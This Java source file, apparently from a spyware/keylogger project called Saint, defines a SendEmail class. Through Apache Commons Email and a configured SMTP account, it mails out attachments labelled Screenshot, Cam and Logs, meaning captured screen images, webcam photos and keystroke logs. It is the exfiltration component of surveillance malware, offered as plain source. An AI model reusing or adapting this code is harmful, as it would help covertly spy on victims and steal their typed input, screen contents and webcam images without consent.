/*
 * Copyright (c) 2017, tiagorlampert
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this
 *   list of conditions and the following disclaimer.
 * * Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
package saint.email;

import java.io.File;
import java.io.IOException;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.apache.commons.mail.SimpleEmail;

/**
 *
 * @author tiagorlampert
 */
public class SendEmail {

    private String smtp;
    private String email_from;
    private String email_password;
    private String email_to;
    private String subject;
    private String msg;
    private String port;
    private boolean ssl;
    private boolean tls;
    private boolean debug;

    public void sendSimpleEmail(String email_to, String subject, String msg) {
        SimpleEmail email = new SimpleEmail();
        try {
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(subject);
            email.setMsg(msg);
            email.setSSL(ssl);
            email.setTLS(tls);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file_screenshot, String file_cam, String file_logs) {
        File cam_file = new File(file_cam);
        if (!cam_file.exists()) {
            try {
                File new_file = new File(file_cam);
                new_file.createNewFile();
            } catch (IOException e) {
                System.out.println(e.getMessage());
            }
        }

        File fileScreenshot = new File(file_screenshot);
        EmailAttachment attachmentScreenshot = new EmailAttachment();
        attachmentScreenshot.setPath(fileScreenshot.getPath());
        attachmentScreenshot.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentScreenshot.setDescription("Screenshot");
        attachmentScreenshot.setName(fileScreenshot.getName());

        File fileCam = new File(file_cam);
        EmailAttachment attachmentCam = new EmailAttachment();
        attachmentCam.setPath(fileCam.getPath());
        attachmentCam.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentCam.setDescription("Cam");
        attachmentCam.setName(fileCam.getName());

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachmentScreenshot);
            email.attach(attachmentCam);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file, String file_logs) {
        File fileScreenshot = new File(file);
        EmailAttachment attachment = new EmailAttachment();
        attachment.setPath(fileScreenshot.getPath());
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        attachment.setDescription("Attachment");
        attachment.setName(fileScreenshot.getName());

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachment);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file_logs) {
        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(email_from);
            email.setAuthentication(email_from, email_password);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public SendEmail(String smtp, String email_from, String email_password, String port, boolean ssl, boolean tls, boolean debug) {
        this.smtp = smtp;
        this.email_from = email_from;
        this.email_password = email_password;
        this.port = port;
        this.ssl = ssl;
        this.tls = tls;
        this.debug = debug;
    }
}
